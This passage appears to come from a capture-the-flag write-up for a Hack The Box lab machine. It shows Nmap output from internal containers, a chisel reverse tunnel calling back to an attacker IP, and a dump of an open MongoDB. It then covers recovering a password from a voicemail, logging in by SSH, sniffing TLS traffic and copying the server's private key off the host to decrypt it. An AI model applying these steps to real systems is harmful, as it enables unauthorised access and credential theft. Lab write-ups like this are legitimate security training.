</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:0<span style="color:#ae81ff">\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(NCP,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(Not
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:esRPC,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:1a\x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(JavaRMI,9,&#34;\x05\0\0\0\x0b\x08\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:05\x1a\0&#34;)%r(WMSRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(oracle-tns,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:32,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>16Inv
</span></span><span style="display:flex;"><span>SF:alid<span style="color:#ae81ff">\x</span>20message-frame<span style="color:#ae81ff">\.\&#34;\x</span>05HY000<span style="color:#e6db74">&#34;)%r(ms-sql-s,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>
</span></span><span style="display:flex;"><span>SF:05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(afp,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">01</span>
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>0fInvalid<span style="color:#ae81ff">\x</span>20message<span style="color:#ae81ff">\&#34;\x</span>05HY000<span style="color:#e6db74">&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap scan report for 172.17.0.5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host is up (0.00015s latency).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Not shown: 65534 closed tcp ports (conn-refused)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">PORT     STATE SERVICE  VERSION
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">8118/tcp open  privoxy?
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| fingerprint-strings: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   DNSVersionBindReqTCP, RPCCheck, RTSPRequest: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 400 Bad Request
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Connection: close
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   GetRequest: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 200 OK
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Origin: *
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Headers: DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,accesstoken,X-RToken,X-Token
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/html; charset=utf-8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 7285
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     ETag: W/&#34;</span>1c75-WUVJYgy+76qLc2hldkHzGR7+Uxg<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     set-cookie: connect.sid=s%3AO5e1S-uwVRl259ATIP02HJYZhPgPiVIH.o2MGZWzTfKSYRWeP0MydfcXvWha3aN%2Bx%2BiPyTdTBt1s; Path=/; Expires=Sun, 03 Dec 2023 10:55:28 GMT; HttpOnly
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Sat, 03 Dec 2022 10:55:28 GMT
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Connection: close
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;!DOCTYPE html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;title&gt;Trudesk &amp;middot; Login&lt;/title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>/css/plugins.min.css<span style="color:#e6db74">&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>/css/app.min.css<span style="color:#e6db74">&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;style type=&#34;</span>text/css<span style="color:#e6db74">&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     html {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     overflow-x: hidden;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     body {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   HTTPOptions: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 200 OK
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Origin: *
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Headers: DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,accesstoken,X-RToken,X-Token
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/plain; charset=utf-8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     ETag: W/&#34;</span>2-nOO9QiTIwXgNtWtBJezz8kv3SLc<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Sat, 03 Dec 2022 10:55:33 GMT
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    Connection: close
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port8118-TCP:V=7.91SVN%I=7%D=12/3%Time=638B2B20%P=x86_64-pc-linux-musl%
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r(GetRequest,1ED8,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Access-Control-Allow-Origi
</span></span><span style="display:flex;"><span>SF:n:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\*\r\n</span>Access-Control-Allow-Methods:<span style="color:#ae81ff">\x</span>20GET,<span style="color:#ae81ff">\x</span>20POST,<span style="color:#ae81ff">\x</span>20PUT,<span style="color:#ae81ff">\x</span>20D
</span></span><span style="display:flex;"><span>SF:ELETE,<span style="color:#ae81ff">\x</span>20PATCH,<span style="color:#ae81ff">\x</span>20OPTIONS<span style="color:#ae81ff">\r\n</span>Access-Control-Allow-Headers:<span style="color:#ae81ff">\x</span>20DNT,X-M
</span></span><span style="display:flex;"><span>SF:x-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cac
</span></span><span style="display:flex;"><span>SF:he-Control,Content-Type,accesstoken,X-RToken,X-Token<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>
</span></span><span style="display:flex;"><span>SF:20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>207285<span style="color:#ae81ff">\r\n</span>ETag:<span style="color:#ae81ff">\x</span>20W/
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\&#34;</span>1c75-WUVJYgy<span style="color:#ae81ff">\+</span>76qLc2hldkHzGR7<span style="color:#ae81ff">\+</span>Uxg<span style="color:#ae81ff">\&#34;\r\n</span>set-cookie:<span style="color:#ae81ff">\x</span>20connect<span style="color:#ae81ff">\.</span>sid<span style="color:#f92672">=</span>s
</span></span><span style="display:flex;"><span>SF:%3AO5e1S-uwVRl259ATIP02HJYZhPgPiVIH<span style="color:#ae81ff">\.</span>o2MGZWzTfKSYRWeP0MydfcXvWha3aN%2Bx
</span></span><span style="display:flex;"><span>SF:%2BiPyTdTBt1s;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Expires<span style="color:#f92672">=</span>Sun,<span style="color:#ae81ff">\x</span>2003<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202023<span style="color:#ae81ff">\x</span>2010:55
</span></span><span style="display:flex;"><span>SF::28<span style="color:#ae81ff">\x</span>20GMT;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Sat,<span style="color:#ae81ff">\x</span>2003<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202022<span style="color:#ae81ff">\x</span>2010:55:
</span></span><span style="display:flex;"><span>SF:28<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html&gt;<span style="color:#ae81ff">\n</span>&lt;h
</span></span><span style="display:flex;"><span>SF:ead&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Trudesk<span style="color:#ae81ff">\x</span>20&amp;middot;<span style="color:#ae81ff">\x</span>20Login&lt;/title&gt;<span style="color:#ae81ff">\n\x</span><span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/css/plugins<span style="color:#ae81ff">\.</span>min<span style="color:#ae81ff">\.</span>cs
</span></span><span style="display:flex;"><span>SF:s<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/css/app<span style="color:#ae81ff">\.</span>m
</span></span><span style="display:flex;"><span>SF:in<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;style<span style="color:#ae81ff">\x</span>20type<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>text/css<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20html<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20overflow-x:<span style="color:#ae81ff">\x</span>20hidden;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">}</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20body<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:)%r(HTTPOptions,1BA,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Access-Control-Allow-Ori
</span></span><span style="display:flex;"><span>SF:gin:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\*\r\n</span>Access-Control-Allow-Methods:<span style="color:#ae81ff">\x</span>20GET,<span style="color:#ae81ff">\x</span>20POST,<span style="color:#ae81ff">\x</span>20PUT,<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>SF:0DELETE,<span style="color:#ae81ff">\x</span>20PATCH,<span style="color:#ae81ff">\x</span>20OPTIONS<span style="color:#ae81ff">\r\n</span>Access-Control-Allow-Headers:<span style="color:#ae81ff">\x</span>20DNT,X
</span></span><span style="display:flex;"><span>SF:-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,C
</span></span><span style="display:flex;"><span>SF:ache-Control,Content-Type,accesstoken,X-RToken,X-Token<span style="color:#ae81ff">\r\n</span>Content-Type:
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>202<span style="color:#ae81ff">\r\n</span>ETag:<span style="color:#ae81ff">\x</span>20W/
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\&#34;</span>2-nOO9QiTIwXgNtWtBJezz8kv3SLc<span style="color:#ae81ff">\&#34;\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Sat,<span style="color:#ae81ff">\x</span>2003<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">202022</span>
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>2010:55:33<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>OK<span style="color:#e6db74">&#34;)%r(RTSPRequest,2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:F,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:%r(RPCCheck,2F,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20cl
</span></span><span style="display:flex;"><span>SF:ose<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)%r(DNSVersionBindReqTCP,2F,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Req
</span></span><span style="display:flex;"><span>SF:uest<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap scan report for 3c371615b7aa (172.17.0.6)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host is up (0.00013s latency).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Not shown: 65534 closed tcp ports (conn-refused)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">PORT   STATE SERVICE VERSION
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">80/tcp open  http    Apache httpd 2.4.51
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-server-header: Apache/2.4.51 (Debian)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: 403 Forbidden
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: Host: 172.17.0.6
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 16 IP addresses (6 hosts up) scanned in 51.74 seconds
</span></span></span></code></pre></div><h3 id="finding-an-open-mongodb-instance">Finding An Open Mongodb Instance</h3>
<p>From the scan above, I can see that <em>mongodb</em> is open on <em>172.17.0.3</em> and that it doesn&rsquo;t require any password to log in, since <em>nmap</em> was able to list the databases.</p>
<p><img src="mongodb_scan.png" alt="Listing Mongodb Tables"></p>
<p>So, now I&rsquo;ll use <em>chisel</em> to port forward the port back to my machine so that I can access it using <code>mongosh</code>.</p>
<ul>
<li>If you don&rsquo;t have it you can follow the installation instructions from here: <em>

<a href="https://www.mongodb.com/docs/mongodb-shell/install/" target="_blank">https://www.mongodb.com/docs/mongodb-shell/install/</a></em></li>
<li>Uploading <em>Chisel</em>:
<img src="uploading_chisel.png" alt="Uploading Chisel"></li>
</ul>
<p>On my kali machine:</p>
<pre tabindex="0"><code>./chisel_1.7.7_linux_amd64 server -p 9001 --reverse
</code></pre><p>On the target machine:</p>
<pre tabindex="0"><code>./chisel_1.7.7_linux_amd64 client 10.10.16.23:9001 R:127.0.0.1:8080:172.17.0.3:27017 &amp;
</code></pre><p>Now, port <em>27017</em> open on the host <em>172.17.0.3</em>, which was accessible only internally, is now forwarded through <em>Chisel</em> listening on my machine port <em>9001</em> and will be accessible for me on port <em>8080</em>.</p>
<p><img src="chisel_port_forwarding.png" alt="Chisel Port Forwarding"></p>
<h3 id="reading-important-information-from-mongodb">Reading Important Information From Mongodb</h3>
<p>I can then use <code>mongosh --port 8080</code> to access the database from my machine:</p>
<p><img src="accessing_mongodb.png" alt="Accessing Mongodb"></p>
<p>By listing the databases using <code>show databases</code>, I can see that there is one called <em>trudesk</em>, so after searching a little bit I found some interesting stuff:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">use</span> <span style="color:#a6e22e">trudesk</span> <span style="color:#75715e">// Switch database to trudesk
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">show</span> <span style="color:#a6e22e">tables</span> <span style="color:#75715e">// Show available tables
</span></span></span></code></pre></div><p><img src="show_db_tables.png" alt="Show Tables mongodb"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">accounts</span>.<span style="color:#a6e22e">find</span>() <span style="color:#75715e">// To list all account&#39;s information
</span></span></span></code></pre></div><p><img src="see_all_db_accounts.png" alt="See All Trudesk Account&amp;rsquo;s Information"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">notifications</span>.<span style="color:#a6e22e">find</span>() <span style="color:#75715e">// To list all the notifications
</span></span></span></code></pre></div><p><img src="seeing_notifications.png" alt="Seeing Notifications"></p>
<h2 id="getting-user-on-carpediem">Getting User On Carpediem</h2>
<h3 id="using-zoiper-to-get-credentials">Using Zoiper To Get Credentials</h3>
<p>After reading the notifications sent between staff members, it appears that a new employee was hired and one the old staff left him a voice mail about his new credentials. They also recommended using <em>Zoiper</em> as desktop soft phone for him to access his voice mails, so this is what I&rsquo;ll use.</p>
<ul>
<li>You can download <em>Zoiper</em> debian package from 

<a href="https://www.zoiper.com/en/voip-softphone/download/current" target="_blank"><em>zoiper&rsquo;s website</em></a> and run the following command in order to install it <code>sudo dpkg -i Zoiper5_5.5.14_x86_64.deb</code></li>
</ul>
<p>Usually <em>Zoiper</em> runs on <em>UDP</em> port <em>5060</em>, and I knew that using google, or from the login prompt of the application after installing it.</p>
<p><img src="continue_as_free_user.png" alt="Zoiper Login For Free"></p>
<p><img src="zoiper_port.png" alt="Zoiper Port"></p>
<h3 id="checking-for-open-udp-port-5060-that-zoiper-uses">Checking For Open UDP Port 5060 That Zoiper Uses</h3>
<p>So if I check that using nmap, I can confirm that the port is indeed open: <code>sudo nmap -p 5060 -sU carpediem.htb</code></p>
<p><img src="udp_port_5060.png" alt="UDP Open Port"></p>
<h3 id="hearing-the-message-and-getting-user">Hearing The Message And Getting User</h3>
<p>From the messages, I saw that in order to login to the domain using zoiper as the new employee, I can use the last <em>4 digits</em> of his employee ID <em>9650</em> as the <em>username</em> and <em>2022</em> as his <em>password</em>. Then to hear the voice mail and get his credentials, I need to dial <em>*62</em> and put the pin code which is <em>2022</em> and then press <em>1</em> to hear it.</p>
<p><img src="login_as_new_employee.png" alt="Login As New Employee"></p>
<p><img src="adding_zoiper_domain.png" alt="Adding carpediem.htb as domain"></p>
<p><img src="click_next_zoiper.png" alt="Click Next"></p>
<p><img src="dial_code_zoiper.png" alt="Dial Code Zoiper"></p>
<p><img src="put_the_pin_code.png" alt="Put The Pin Code"></p>
<p><img src="hearing_message.png" alt="Hear The Message"></p>
<p>So the password for the new employee is <em>AuRj4pxq9qPk</em>. His name, from the previous notifications, appears to be <em>Horace Flaccus</em>, and previously I saw the emails (when reading account information from mongodb) in the form of <em>[First Initial][Last name]</em>, so my guess is that the new username will be <em>hflaccus</em>, and this what I&rsquo;ll try to provide to see if I can login using <em>SSH</em>.</p>
<p>And it worked:</p>
<p><img src="hflaccus_ssh_login.png" alt="SSH Login hflaccus"></p>
<h2 id="discovering-backdrop-instance">Discovering Backdrop Instance</h2>
<p>Going back to <em>nmap</em> scan for the ip <em>172.17.0.2</em> (done previously), I can see that it is running a webserver on port <em>443</em> disclosing a new subdomain <em>backdrop.carpediem.htb</em>.</p>
<p><img src="nmap_scan_backdrop_domain.png" alt="Backdrop Domain Disclosed"></p>
<p>And aslo from the notifications in mongodb, I noticed some messages related to this webserver running <em>SSL</em> (port 443).</p>
<p><img src="notifications_backdrop_mongodb.png" alt="Notifications About Backdrop In Mongodb"></p>
<h3 id="sniffing-traffic-going-to-backdrop">Sniffing Traffic Going To Backdrop</h3>
<p>In addition, if I run <code>timeout 1 tcpdump</code> I can see that I am able to run <em>tcpdump</em> command which means that I might be able to sniff some traffic and grab credentials.</p>
<p>Moreover, if I check <em>/etc/ssl/certs/</em> I can see that the certificate and its private key for backdrop cms are present in there:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hflaccus@carpediem:/tmp$ ls -la /etc/ssl/certs/backdrop.carpediem.htb.*
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1269</span> Apr  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2022</span> /etc/ssl/certs/backdrop.carpediem.htb.crt
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1679</span> Apr  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2022</span> /etc/ssl/certs/backdrop.carpediem.htb.key
</span></span></code></pre></div><p>So what I&rsquo;ll do is to sniff ssl traffic goind to backdrop, decrypt it, and see if I can get some credentials:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hflaccus@carpediem:/tmp$ tcpdump -i docker0 -c <span style="color:#ae81ff">50</span> -nn -A -w 443.pcap port <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>tcpdump: listening on docker0, link-type EN10MB <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>, capture size <span style="color:#ae81ff">262144</span> bytes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50</span> packets captured
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">57</span> packets received by filter
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> packets dropped by kernel
</span></span></code></pre></div><ul>
<li>50 packets should be enough to get credentials.</li>
</ul>
<h3 id="decrypting-ssl-traffic">Decrypting SSL Traffic</h3>
<p>Now, I&rsquo;ll copy the new <em>pcap</em> file and the certificate&rsquo;s private key to my machine and decrypt the traffic to what&rsquo;s happening:</p>
<pre tabindex="0"><code>scp hflaccus@carpediem.htb:/tmp/443.pcap .
scp hflaccus@carpediem.htb:/etc/ssl/certs/backdrop.carpediem.htb.key .
</code></pre><p><img src="copy_pcap_cert_key_to_kali.png" alt="Copying PCAP File And Private Key To Kali"></p>
<p>To add the private key, I need to head to <em>edit =&gt; prefrecences =&gt; tls =&gt; pre-master key</em> or <em>edit =&gt; prefrecences =&gt; RSA Keys</em>, depending on the wireshark version used, and then add it:</p>
<p><img src="click_preferences.png" alt="Click Preferences"></p>
<p><img src="click_add_key.png" alt="Click Add Key"></p>
<p><img src="choose_key.png" alt="Choose Key"></p>
<p><img src="click_ok.png" alt="Click OK"></p>
